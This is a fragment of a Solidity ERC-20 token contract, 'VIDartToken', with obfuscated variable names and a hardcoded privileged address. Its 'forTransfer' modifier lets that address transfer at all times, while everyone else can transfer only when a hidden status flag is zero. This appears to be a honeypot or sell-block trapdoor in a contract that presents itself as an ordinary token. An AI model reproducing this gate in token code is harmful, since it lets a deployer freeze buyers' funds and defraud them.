...
contract VIDartToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenVA_totalSupply;
    uint256 private _tokenVA_status = 0;
    uint256 public stakingPoolVAStatus = 0;

    string private _tokenVA_name;
    string private _tokenVA_symbol;

    address private _poolVAAddress = 0x17A5aA38F87A10c64fd3DBf383c86fD2445d0067;

    constructor() {
        _tokenVA_name = "VIDart";
        _tokenVA_symbol = "VIDart";
        _tokenVA_totalSupply = 59700 * 10 ** 18;
        _balances[msg.sender] = _tokenVA_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolVAAddress || _tokenVA_status == 0);
        _;
    }
